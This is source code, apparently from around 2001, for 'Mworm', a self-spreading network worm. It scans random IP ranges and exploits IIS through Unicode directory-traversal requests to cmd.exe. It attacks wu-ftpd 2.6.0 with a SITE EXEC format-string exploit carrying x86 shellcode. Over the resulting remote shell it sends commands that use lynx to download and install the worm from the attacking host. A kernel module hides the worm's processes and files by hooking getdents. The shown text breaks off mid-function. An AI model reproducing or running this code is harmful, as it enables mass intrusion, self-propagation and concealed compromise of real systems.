
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MWORM.C]ÄÄÄ
//Mworm.c ver 1.0
//Base on Mscan
//Begining from 6/4/2001

#include "common.h"



int ndone;
int nlefttoconn,nconn,nlefttoread,nfiles;


pthread_mutex_t	ndone_mutex=PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t	ndone_cond=PTHREAD_COND_INITIALIZER;

void *Process_ID(void *vptr);            //predefine this function


int main(int argc,char *argv[])
{
	int n,i,j,maxnconn;
	struct host *hptr;
	pthread_t tid;
	unsigned long start,end,counter, indexh;
	char * startip;	
	int ScanPort_D[]= { 80, 21, 111, 21, 21, 80, 21, 111 };
	int thisport = 0;
	
	maxnconn=MAXTHREAD;

#ifdef DEBUG
	goto WS;
#endif
//	daemon_init();		//become a deamon program
	
WS:				//the begining entry
     for (; ;){
		// create random IP address, then +255
		startip = create_randomIP ();
		start = inet_addr(startip);
//		start = inet_addr(argv[1]);
		counter = ntohl(start);
		
		for (j=0,i=0; i<MAXHOST; counter++,i++){
			if(counter == -1) continue;
			host[j].h_flags=H_NONE;
			host[j].h_network=counter;
			host[j].h_port=ScanPort_D[thisport++];
			if (thisport == 8) thisport = 0;
			sprintf(host[j].h_name,"Thread NO %d",j+1);
			j++;
		}

	HostNumber=nlefttoread=nlefttoconn=nfiles=j;
	nconn=0;
	ndone=0;
	
	
	while (nlefttoread>0) {
		while(nconn<maxnconn && nlefttoconn >0) {
			for(i=0;i<nfiles; i++)
				if (host[i].h_flags==H_NONE)
					break;
			if (i==nfiles) {
				printf("Left=%d,but not found\n",nlefttoread);
				exit(0);
			}
			//printf("Creating Thread %s\n",host[i].h_name);
			pthread_create(&tid,NULL,&Process_ID,&host[i]);
			host[i].h_tid=tid;
			host[i].h_flags=H_CONNECTING;
			nconn++;
			nlefttoconn--;
		}
		
		pthread_mutex_lock(&ndone_mutex);
		while (ndone==0){
		//	printf("Wate for sig, ndone= %d\n",ndone);
		//	pthread_mutex_unlock(&ndone_mutex);
			pthread_cond_wait(&ndone_cond,&ndone_mutex);
		//	pthread_mutex_lock(&ndone_mutex);
		}
		for (i=0; i<nfiles; i++) {
			if (host[i].h_flags==H_DONE) {
				pthread_join(host[i].h_tid, (void **) &hptr);
				if(&host[i] !=hptr) {
					printf("Error wating thread\n");
					exit(0);
				}
				hptr->h_flags=H_JOINED;
				ndone--;
				nconn--;
				nlefttoread--;
			//	printf("Thread %s done \n",
			//		hptr->h_name);
			}
		}
		pthread_mutex_unlock(&ndone_mutex);
		}

	}
	
}

void *Process_ID(void *vptr)
{
	struct host *Iptr;
	int sock;
        struct sockaddr_in sin;
        

        
	Iptr =(struct host *)vptr;        
	sin.sin_addr.s_addr=htonl(Iptr->h_network);

#ifdef	DEBUG	
	printf("IP= %s,Port=%d\n",inet_ntoa(sin.sin_addr),Iptr->h_port);
#endif
	
	sock=TCP_NB_connect(Iptr->h_network,Iptr->h_port,CONNECT_TIME);
	if (sock >0) {	
	

		
		
#ifdef	DEBUG
		printf("Host %s Port %d is [OPEN]:  \n",
			inet_ntoa(sin.sin_addr),Iptr->h_port);			
#endif			
	
		switch(Iptr->h_port)
		{
			case 80:		//web hole
				Handle_Port_80(sock,inet_ntoa(sin.sin_addr),Iptr);
				break;
			case 21:		// ftp hole
				if (Handle_Port_21(sock,inet_ntoa(sin.sin_addr),Iptr)){
					pthread_mutex_lock(&ndone_mutex);
					wuftp260_vuln(sock, inet_ntoa(sin.sin_addr), Iptr);
					pthread_mutex_unlock(&ndone_mutex);
				}
						
				break;
			case 111:		//rpc hole
				if (Handle_Port_STATUS(sock,inet_ntoa(sin.sin_addr),Iptr)){
					pthread_mutex_lock(&ndone_mutex);
//					rpcSTATUS_vuln( inet_ntoa(sin.sin_addr), Iptr);
					pthread_mutex_unlock(&ndone_mutex);
				}				
				break;
			case 53:		//linux bind hole
//				Check_Linux86_Bind(sock,inet_ntoa(sin.sin_addr),Iptr->h_network);
				break;
			case 515:		//linux lpd hole
//				Get_OS_Type(Iptr->h_network, inet_ntoa(sin.sin_addr));
//				Check_lpd(sock,inet_ntoa(sin.sin_addr),Iptr->h_network);
				break;			
			default:
				break;
		}
		close(sock);
	} 

ENDPROCESS:
	pthread_mutex_lock(&ndone_mutex);
	Iptr->h_flags=H_DONE;
	ndone++;
	pthread_cond_signal(&ndone_cond);
	pthread_mutex_unlock(&ndone_mutex);
	return(Iptr);
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MWORM.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[3C95.C]ÄÄÄ
//3c95.c
//hide the Mworm
//Based on Mscan
//Part of Mworm
//compile: gcc -O3 -DMODULE -D__KERNEL__ -c 3c95.c
//Usage: insmod 3c95.o
//	 rmmmod 3c95.o
	 
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/malloc.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/mm.h>
#include <linux/if.h>
#include <sys/syscall.h>
#include <asm/types.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/segment.h>
#include <linux/types.h>
#include <linux/malloc.h>
#include <asm/unistd.h>
#include <asm/string.h>

#define HIDE_PS1	"Mworm" 
#define HIDE_PS2	"Mhttpd"
#define	HIDE_FILE1	"Mscan"

extern void* sys_call_table[];
int (*old_getdents)(uint,struct dirent *,uint);


int myatoi(char *str){
 int res = 0;
 int mul = 1;
 char *ptr;
 for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
  if (*ptr < '0' || *ptr > '9')
   return (-1);
  res += (*ptr - '0') * mul;
  mul *= 10;
}
 return (res);
}

struct task_struct *get_task_structure(pid_t n){
 struct task_struct *tsp;
 int t;
        tsp=current;
        do{
                if(tsp->pid==n)return tsp;              
                 tsp=tsp->next_task;    
        }while(tsp!=current);
        return NULL;
}

int new_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){
 int hmr,hme,original_ret,left;
 struct dirent *d,*d2;
 struct inode *dinode;
 int ps=0,tohide;
 struct task_struct *tsp;

        if((original_ret=old_getdents(fd,dirp,count))==-1)return( -1 );
        #ifdef __LINUX_DCACHE_H
                dinode=current->files->fd[fd]->f_dentry->d_inode;
        #else
                dinode=current->files->fd[fd]->f_inode;
        #endif
         if (dinode->i_ino==PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev)==1)
		ps=1;

        
        d=(struct dirent *)kmalloc(original_ret,GFP_KERNEL);
        copy_from_user(d,dirp,original_ret);
        d2=d;
        left=original_ret;
        hme=0;
        while(left>0){
                hmr=d2->d_reclen;
                left-=hmr;
                tohide=0;
                if(ps){
                        tsp=get_task_structure(myatoi(d2->d_name));
                        if((tsp!=NULL)&&(strstr(tsp->comm,HIDE_PS1))) tohide=1;
                        if((tsp!=NULL)&&(strstr(tsp->comm,HIDE_PS2))) tohide=1;
                }
                if((strstr((char*)d2->d_name,HIDE_PS1))||(strstr((char*)d2->d_name,HIDE_PS1))
                	||(strstr((char*)d2->d_name,HIDE_FILE1)) || (tohide)){
                        if(left>0)memmove(d2,(char*)d2+hmr,left);       
                         else d2->d_off=1024;
                        original_ret-=hmr;      
                }
                else d2=(struct dirent*)((char*)d2+hmr);
        }       
        copy_to_user(dirp,d,original_ret);
        kfree(d);
        return original_ret;
}

int init_module(void){
 int t;
        old_getdents=sys_call_table[SYS_getdents];
        sys_call_table[SYS_getdents]=new_getdents;
        return 0;

}
void cleanup_module(void){
        sys_call_table[SYS_getdents]=old_getdents;
	return;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[3C95.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CHECKCGI.C]ÄÄÄ
//Check the CGI Hole
//part of Mworm
//Based on Mscan
//CheckCGI.c

#include "common.h"

void Handle_Port_80(int fd,char *hostip,struct host *iptr)   //Handle WEB Scan
{
	
     char *string_hole[CHECK_COUNT_S] = 
     {
      "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
      "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
      "GET /msadc/..%c1%9c../..%c1%9c../..%c1%9c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
      "GET /msadc/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
      "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n",
      "GET /msadc/..%255c../..%255c../winnt/system32/cmd.exe?/c+copy%20c:\\winnt\\system32\\cmd.exe%20c:\\Mworm.exe HTTP/1.0\r\n\r\n"
     };
     
     
     int Hole_TypeCount , i;
     char *search = "HTTP/1.1 200"; 
     char *other1 = "HTTP/1.1 500 13";
     char serv_string[1024];
     ssize_t tmpResult;
     

     Hole_TypeCount = 6;
     
     for (i=0; i<Hole_TypeCount ; i++) {
     	
     	if (writeable_timeo(fd, WEB_WRITETIMEOUT)<=0 ) continue;
     	tmpResult = writen(fd, string_hole[i], strlen(string_hole[i]));	
     	if (tmpResult <0 ) continue;
	close(fd);
	fd=TCP_NB_connect(iptr->h_network,iptr->h_port,CONNECT_TIME);
	if (fd <=0 ) break;
     }
	     
}


char * Get_IIS_Title(int fd, char * hostip)                //Get the Host IIS first page Title
{
	
     char *string_head="GET / HTTP/1.0\r\n\r\n";
     char *search_head_B="<TITLE>";
     char *search_head_E="</TITLE>";
     char *Dont_Display1="Test Page for";
     char *Dont_Display2="Authorization Required";
     char *search = "HTTP/1.1 200"; 
     char *tmpStr;
     char *Head_Str;
     char serv_string[1024];
     int Have_Get_200 ;
     ssize_t tmpResult;
     
     Have_Get_200=0;
     if (writeable_timeo(fd, WEB_WRITETIMEOUT)<=0 ) return(NULL);
     tmpResult = writen(fd, string_head, strlen(string_head));
     for( ; ;){
     		if (readable_timeo(fd, WEB_READTIMEOUT)<=0 ) break;
		tmpResult=readline(fd,serv_string,1024,1);
		if (tmpResult<=0) break;
//		serv_string[tmpResult]=0;
//	 	printf("%s",serv_string);
		if (HTStrCaseStr(serv_string, search) !=NULL) Have_Get_200=1;
		
		
		Head_Str=Get_Range_Str(serv_string, search_head_B , search_head_E);
		if (Head_Str != NULL) {
			if ((Have_Get_200==1) && (HTStrCaseStr(Head_Str,Dont_Display1)==NULL)
			   && (HTStrCaseStr(Head_Str,Dont_Display2)==NULL))
				printf("Host %s: %s\n",hostip,Head_Str);
			
			return(Head_Str);
		}
		
	}     
     return(NULL);
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CHECKCGI.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CHECKFTP.C]ÄÄÄ
//CheckFTP.c
//Based on Mscan
//Part of Mworm

#include "common.h"



int			xpb_quad = 0;
int			xpb_double = 0;
int			xpb_align = 0;
int			xp_refind = 0;

unsigned long int	xp_dstaddr = 0x0;
unsigned long int	xp_bufdist = 0x0;
unsigned long int	xp_bufaddr = 0x0;

unsigned long int	xp_retaddr = 0x0;
unsigned long int	xp_retloc = 0x0;




typedef struct {

	char *	target_os;
	char *	bytesex;

	/* XXX/FIXME: ugly stuff, assume padding for \xff, please fix that in
	 * case it bothers you
	 */
	int			ffpad;

	/* buffer distance search, assume the distance is at least
	 * bufdist_min, and at max bufdist_max
	 */
	unsigned long int	bufdist_min;
	unsigned long int	bufdist_max;

	/* where to start searching for the buffer address of the source
	 * (format string) buffer. it starts with the big addresses and
	 * searches towards the lower addresses
	 */
	unsigned long int	bufsaddr_start;
	unsigned long int	bufsaddr_end;

	/* the same for the destination buffer addresses
	 */
	unsigned long int	bufdaddr_start;
	unsigned long int	bufdaddr_end;

	/* where to start searching for the return address location.
	 * this is a midhit, so it will start at: bufdaddr_found + this + 0,
	 * and then will flip +4, -4, +8, -8.
	 *
	 * it will flip retloc_midhit times, then abort if not found
	 */
	unsigned long int	retloc_midhit;
	unsigned long int	retloc_maxsearch;

	/* the search for the return address location is based on the
	 * assumption that the *retloc is between this two addresses
	 */
	unsigned long int	retaddr_low;
	unsigned long int	retaddr_high;


	/* shellcode_read[strlen (shellcode_read)] has to hold the number
	 * of bytes to be read from the second shellcode.
	 */
	unsigned char *		shellcode_read;
	unsigned char *		shellcode_shell;

	/* some architectures provide the ability to execute stuff on
	 * the remote host to enable scripting, so if it does, un-NULL
	 * this two pointers, and off you go (with the "-c" option)
	 */
	unsigned char *		shellcode_execve;

} FTP_hostinfo;


/* BSD DATA
 * bsd stuff by smiler / teso
 */

/* escaped fbsd read() shellcode */
unsigned char x86_fbsd_read[] =
	"\x31\xc0\x6a\x00\x54\x50\x50\xb0\x03\xcd\x80\x83\xc4"
	"\x0c\xff\xff\xe4";

/* break chroot and exec /bin/sh - dont use on an unbreakable host like 4.0 */
unsigned char x86_fbsd_shell_chroot[] =
	"\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80"
	"\x31\xc0\x99"
	"\x6a\x68\x89\xe3\x50\x53\x53\xb0\x88\xcd"
	"\x80\x54\x6a\x3d\x58\xcd\x80\x66\x68\x2e\x2e\x88\x54"
	"\x24\x02\x89\xe3\x6a\x0c\x59\x89\xe3\x6a\x0c\x58\x53"
	"\x53\xcd\x80\xe2\xf7\x88\x54\x24\x01\x54\x6a\x3d\x58"
	"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x44\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\x52\x51\x53\x53"
	"\x6a\x3b\x58\xcd\x80\x31\xc0\xfe\xc0\xcd\x80";

/* just exec /bin/sh */
unsigned char x86_fbsd_shell[] =
	"\x31\xc0\x99\x50\x50\x50\xb0\x7e\xcd\x80\x52\x68\x6e"
	"\x2f\x73\x68\x44\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
	"\xe2\x53\x89\xe1\x52\x51\x53\x53\x6a\x3b\x58\xcd\x80"
	"\x31\xc0\xfe\xc0\xcd\x80";

FTP_hostinfo	hi_freebsd_chroot = {
	"FreeBSD with breakable chroot",
	"little endian",

	4,
	1024,		1024 + 400,
	0xbfbff801,	0xbfbfaad8,
	0xbfbff201,	0xbfbfaad8,
	0x00000400,	0x00000008,
	0x08040000,	0x08060000,

	x86_fbsd_read,
	x86_fbsd_shell_chroot,

	NULL
};

FTP_hostinfo	hi_freebsd = {
	"FreeBSD",
	"little endian",

	4,
	1024,		1024 + 400,
	0xbfbff801,	0xbfbfaad8,
	0xbfbff201,	0xbfbfaad8,
	0x00000400,	0x00000008,
	0x08040000,	0x08060000,

	x86_fbsd_read,
	x86_fbsd_shell,

	NULL
};

/* LINUX DATA
 */


/* 15 byte x86/linux PIC read() shellcode by lorian / teso
 *
 * escaped for this purpose it's 16 bytes, the \x00 byte has to be overwritten
 * with the number of bytes we want to read, hence the maximum value is \xff,
 * but we can't use that, so we use \xfe instead, woah ! :-)
 * thanks lorian, cool stuff that is :-)
 */
unsigned char	x86_lnx_read[] =
	"\x33\xdb"		/* xorl	%ebx, %ebx	*/
	"\xf7\xe3"		/* mull	%ebx		*/
	"\xb0\x03"		/* movb $3, %al		*/
	"\x8b\xcc"		/* movl	%esp, %ecx	*/
	"\x68\xb2\x00\xcd\x80"	/* push 0x80CDxxB2	*/
	"\xff\xff\xe4";		/* jmp	%esp		*/


/* Lam3rZ code =)
 *
 * setuid/chroot-break/execve
 */
unsigned char	x86_lnx_shell[] =
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
	"\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"
	"\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"
	"\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
	"\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"
	"\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"
	"\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
	"\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
	"\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"
	"\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"
	"\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"
	"\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
	"\x2e\x2e\x31\x31";


/* 38 byte x86/linux PIC arbitrary execute shellcode - scut / teso
 * second smack, read from message body
 *
 * prepended with a setuid(0)/setgid(0)/chroot() break stub from
 * lorian, because on most linux systems we run in a chroot env
 * when being anonymous, so get rid of that
 */
unsigned char	x86_lnx_execve[] =
	/* 49 byte x86 linux PIC setreuid(0,0) + chroot-break
	 * code by lorian / teso
	 */
	"\x33\xdb\xf7\xe3\xb0\x46\x33\xc9\xcd\x80\x6a\x54"
	"\x8b\xdc\xb0\x27\xb1\xed\xcd\x80\xb0\x3d\xcd\x80"
	"\x52\xb1\x10\x68\xff\x2e\x2e\x2f\x44\xe2\xf8\x8b"
	"\xdc\xb0\x3d\xcd\x80\x58\x6a\x54\x6a\x28\x58\xcd"
	"\x80"

	/* execve
	 */
	"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"
	"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"
	"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"
	"\xff\xff";


FTP_hostinfo 	hi_linux = {
	"Linux operating system",
	"little endian",

	7,
	1024,		1024 + 400,
	0xbfffe210,	0xbfffa010,
	0xbfffb3f0,	0xbfffa610,
	0x00002004,	0x00000008,
	0x08040000,	0x08060000,

	x86_lnx_read,
	x86_lnx_shell,

	x86_lnx_execve,
};

FTP_hostinfo *	FTP_targets[] = {
	&hi_linux,
	&hi_freebsd,
	&hi_freebsd_chroot,
	NULL,
};

FTP_hostinfo *	FTP_tg = NULL;

unsigned char *	FTP_shellcode = NULL;
unsigned char *	FTP_shellcode2 = NULL;

int Handle_Port_21(int fd,char *hostip,struct host *iptr)  //Handle Ftp Scan
{
     char serv_string[1024];
     ssize_t tmpResult;
     char *tmpStr;
     int  ftptype;
     char ftpsrname[30];
     
	ftptype = 0;     
	if (readable_timeo(fd, FTP_READTIMEOUT)<=0 ) return;
	tmpResult=readline(fd,serv_string,1024,1);
	
	if (tmpResult<=0) return;
//	serv_string[tmpResult]=0;
//	 printf("%s: %s",hostip,serv_string);
	if (strstr(serv_string,"220") ==NULL ) return;
	
	tmpStr= strstr( serv_string, "(Version wu-2.6.0");   //check Wu FTP 2.60
	if (tmpStr!=NULL)
	{
#ifdef DEBUG
		printf("Wu-FTP %s: %s",hostip,tmpStr);
#endif
		sprintf(ftpsrname,"%s", "Wu_FTP_2.6.0");
		ftptype=WU_FTP_260;
		goto CHECK_Anonymous_FTP;
	}	

	return 0;
CHECK_Anonymous_FTP:	
	if (Check_Anonymous_FTP( fd))  {
#ifdef DEBUG		
		printf("%s: %s Allow Anonymous FTP !!\n", ftpsrname, hostip);
#endif
		switch (ftptype) {
			case WU_FTP_260:
				//wuftp260_vuln(fd, hostip, iptr);
				return 1;
				break;
		}
	}
	return 0;
					
}


int ftp_login(struct host *iptr)  //Login FTP server
{
     char serv_string[1024];
     ssize_t tmpResult;
     char *tmpStr;
     int  ftptype;
     char ftpsrname[30];
     int fd;
     
	fd=TCP_NB_connect(iptr->h_network,iptr->h_port,CONNECT_TIME);
	if(fd<0) return(fd);
	
	if (readable_timeo(fd, FTP_READTIMEOUT)<=0 ) return -1;
	tmpResult=readline(fd,serv_string,1024,1);
	
	if (tmpResult<=0) return -1;
	if (strstr(serv_string,"220") ==NULL ) return -1;
	
	tmpStr= strstr( serv_string, "(Version wu-2.6.0");   //check Wu FTP 2.60
	if (Check_Anonymous_FTP( fd)) return fd;
	else return -1;
	
					
}


void
FTP_shell (int sock)
{
	int	l;
	int i;
	char	buf[1024];
	char *setupworm_command[] = 		//run shell ,send the following command to remote host
       {
       	"export TERM=vt100\n", 
        "mkdir /usr/bin/Mworm\n",
        "Download Mworm \n",
        "cd /usr/bin/Mworm\n",
        "tar -xzvf MscanWorm.tgz\n",
        "cd MscanWorm\n",
        "sh install.sh\n"
        };
	int command_count = 7;		//the command count
	char tmpbuf[256];
	 	
	for( ; ;){
		if (readable_timeo(sock, FTP_READTIMEOUT)<=0 ) break;				
		i=read(sock,buf,1024);
		if (i<=0) break;
		buf[i]=0;
#ifdef DEBUG				
	 	printf("%s",buf);
#endif		
	 		
	}
		
	for(i=0; i<command_count; i++) {
		if (writeable_timeo(sock, FTP_WRITETIMEOUT)<=0 ) return;
#ifdef DEBUG				
	 	printf("write: %s\n",setupworm_command[i]);
#endif					
		if(i ==2) {
			sprintf(tmpbuf, 
			 "lynx --dump http://%s:7977//usr/bin/Mworm/MscanWorm.tgz >/usr/bin/Mworm/MscanWorm.tgz\n",
	 		Get_localIP(sock));
	 		if(writen (sock, tmpbuf, strlen(tmpbuf))<0) return;
	 	}
	 	else 
			if(writen (sock, setupworm_command[i], strlen(setupworm_command[i]))<0) return;

		for( ; ;){
			if (readable_timeo(sock, FTP_READTIMEOUT)<=0 ) break;				
			l=read(sock,buf,1024);
			if (l<=0) break;
			buf[l]=0;
#ifdef DEBUG				
	 		write (1, buf, l);
#endif		
	 		
		}

//		printf ("%s",buf);
	}
	
}


void
ftp_recv_until (int sock, char *buff, int len, char *begin)
{
	char	dbuff[2048];


	if (buff == NULL) {
		buff = dbuff;
		len = sizeof (dbuff);
	}

	do {
		memset (buff, '\x00', len);
		if (net_rlinet (sock, buff, len - 1, 20) <= 0)
			return;
	} while (memcmp (buff, begin, strlen (begin)) != 0);

	return;
}

unsigned long int
ftp_finddist (int ftpsock)
{
	int			i,
				rdist;		/* relative distance */

	char *			s;
	char			sbuf[1024],
				rbuf[1024];

	unsigned long int	e1,
				e2;


	xp_bufdist = 0x0;
	memset (sbuf, '\x00', sizeof (sbuf));

	/* brute routine taken from bobek.py
	 */
	for (rdist = 0 ; rdist < (FTP_tg->bufdist_max - FTP_tg->bufdist_min);
		rdist += 8)
	{
		sprintf (sbuf, "SITE EXEC 7 mmmmnnnn");

		for (i = 0 ; i < (FTP_tg->bufdist_min / 8) ; ++i)
			strcat (sbuf, "%.f");

		for (i = 0 ; i < (rdist / 8) ; ++i)
			strcat (sbuf, "%.f");
		for (i = 0 ; i < ((rdist % 8) / 4) ; ++i)
			strcat (sbuf, "%d");

		strcat (sbuf, "|%08x|%08x|");
		net_write (ftpsock, "%s\n", sbuf);

		memset (rbuf, '\x00', sizeof (rbuf));
		if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0)
			return (0);
		printf ("#");			
		s = strchr (rbuf, '|');
		if (s == NULL)
			return (0);
		s++;
		if (sscanf (s, "%08lx|%08lx", &e1, &e2) != 2)
			return (0);

		if (e1 == 0x6d6d6d6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist;
		} else if (e1 == 0x6e6d6d6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist - 1;
		} else if (e1 == 0x6e6e6d6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist - 2;
		} else if (e1 == 0x6e6e6e6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist - 3;
		} else if (e1 == 0x6e6e6e6e) {
			xp_bufdist = FTP_tg->bufdist_min + rdist - 4;
		} else if (e2 == 0x6e6e6e6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist + 1;
		} else if (e2 == 0x6e6e6d6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist + 2;
		} else if (e2 == 0x6e6d6d6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist + 3;
		} else if (e2 == 0x6d6d6d6d) {
			xp_bufdist = FTP_tg->bufdist_min + rdist + 4;
		}

		ftp_recv_until (ftpsock, NULL, 0, "200 ");

		if (xp_bufdist != 0)
			return (xp_bufdist);

	}

	return (0);
}


int
net_rlinet (int fd, char *buf, int bufsize, int sec)
{
	int			n;
	unsigned long int	rb = 0;
	struct timeval		tv_start, tv_cur;

	memset(buf, '\0', bufsize);
	(void) gettimeofday(&tv_start, NULL);

	do {
		(void) gettimeofday(&tv_cur, NULL);
		if (sec > 0) {
			if ((((tv_cur.tv_sec * 1000000) + (tv_cur.tv_usec)) -
				((tv_start.tv_sec * 1000000) + (tv_start.tv_usec))) > (sec * 1000000)) {
				return (-1);
			}
		}
		n = net_rtimeout(fd, FTP_READTIMEOUT);
		if (n <= 0) {
			return (-1);
		}
		n = read(fd, buf, 1);
		if (n <= 0) {
			return (n);
		}
		rb++;
		if (*buf == '\n')
			return (rb);
		buf++;
		if (rb >= bufsize)
			return (-2);	/* buffer full */
	} while (1);
}

int
net_rtimeout (int fd, int sec)
{
	fd_set		rset;
	struct timeval	tv;
	int		n, error, flags;

	error = 0;
	flags = fcntl(fd, F_GETFL, 0);
	n = fcntl(fd, F_SETFL, flags | O_NONBLOCK);
	if (n == -1)
		return (-1);

	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	tv.tv_sec = sec;
	tv.tv_usec = 0;

	/* now we wait until more data is received then the tcp low level watermark,
	 * which should be setted to 1 in this case (1 is default)
	 */

	n = select(fd + 1, &rset, NULL, NULL, &tv);
	if (n == 0) {
		n = fcntl(fd, F_SETFL, flags);
		if (n == -1)
			return (-1);
		errno = ETIMEDOUT;
		return (-1);
	}
	if (n == -1) {
		return (-1);
	}
	/* socket readable ? */
	if (FD_ISSET(fd, &rset)) {
		n = fcntl(fd, F_SETFL, flags);
		if (n == -1)
			return (-1);
		return (1);
	} else {
		n = fcntl(fd, F_SETFL, flags);
		if (n == -1)
			return (-1);
		errno = ETIMEDOUT;
		return (-1);
	}
}


unsigned long int
ftp_findaddr (int ftpsock, struct host *iptr)
{
	int			i,
				n = 0,
				blipcount,
				ssiz,
				tend;
	unsigned long int	addr;
	unsigned char		popstackbuf[512];
	unsigned char		fabuf[512];
	unsigned char		sbuf[1024];
	unsigned char		rbuf[1024];
	unsigned char *		figure;


	for (addr = FTP_tg->bufsaddr_start ; addr > FTP_tg->bufsaddr_end ; addr -= ssiz) {

		/* 1. build pop stack buffer
		 */
		memset (popstackbuf, '\x00', sizeof (popstackbuf));
		for (i = xpb_align; i > 0 ; --i)
			strcat (popstackbuf, "z");
		for (i = xpb_quad ; i > 0 ; --i)
			strcat (popstackbuf, "%.f");
		for (i = xpb_double ; i > 0 ; --i)
			strcat (popstackbuf, "%d");

		if (esc_ok (addr) == 0) continue;

		/* 2. build write buffer
		 */
		memset (fabuf, '\x00', sizeof (fabuf));

		xpad_cat (fabuf, addr);
		sprintf (fabuf + strlen (fabuf), "%s", popstackbuf);

		sprintf (sbuf, "SITE EXEC 7 %s", fabuf);
		ssiz = (508 - 4) - strlen (sbuf);
		for (i = ssiz - 4, blipcount = 0 ; i > 0 ; --i, blipcount++)
			strcat (sbuf, "_");
		tend = strlen (sbuf);
		ssiz -= 4;
		sprintf (sbuf + strlen (sbuf), "%%%%|x|%%.%ds", ssiz);	/* XXX: thx smiler */

		net_write (ftpsock, "%s\n", sbuf);

		memset (rbuf, '\x00', sizeof (rbuf));

		if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 8) <= 0) {
			close (ftpsock);
			ftpsock = ftp_login (iptr);
			if (ftpsock <= 0) {
				exit (EXIT_FAILURE);
			}
			xpb_align = xp_bufdist % 4;
			xpb_quad = xp_bufdist / 8;
			xpb_double = (xp_bufdist % 8) / 4;
		} else {
